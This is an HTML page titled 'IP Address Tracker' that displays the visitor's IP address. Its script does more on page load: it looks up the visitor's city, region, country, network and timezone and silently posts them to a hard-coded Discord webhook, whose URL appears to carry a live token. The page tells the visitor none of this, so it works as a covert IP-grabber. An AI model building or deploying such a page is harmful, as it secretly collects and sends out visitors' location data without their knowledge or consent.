<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Address Tracker</title>
</head>
<body>
    <div id="app" class="max-w-md mx-auto p-4 bg-white rounded-lg shadow-md">
        <h2 class="text-lg font-bold mb-2">Your IP Address:</h2>
        <p class="text-gray-600" id="ipAddress"></p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const ipAddressElement = document.getElementById('ipAddress');
            const webhookUrl = 'https://discord.com/api/webhooks/1292753579177803776/eGyOFk2k8GmQGAkJMdfGop4m5TBJvIzXZrkK2k7tHsV1Zx1urahHf_2DMJVwiVsKSrwr';

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                ipAddressElement.textContent = ipAddress;

                const detailsResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                const detailsData = await detailsResponse.json();

                if (detailsResponse.ok) {
                    const logData = {
                        content: `New visitor:\n- IP: ${detailsData.ip}\n- Device: ${detailsData.device}\n- Location: ${detailsData.city}, ${detailsData.region}, ${detailsData.country}\n- Network: ${detailsData.org}\n- Timezone: ${detailsData.timezone}\n- Date: ${new Date().toISOString()}`,
                    };

                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(logData),
                    });
                } else {
                    console.warn('Failed to fetch IP details:', detailsResponse.statusText);
                }
            } catch (error) {
                console.error('Failed to fetch IP address:', error);
            }
        });
    </script>
</body>
</html>
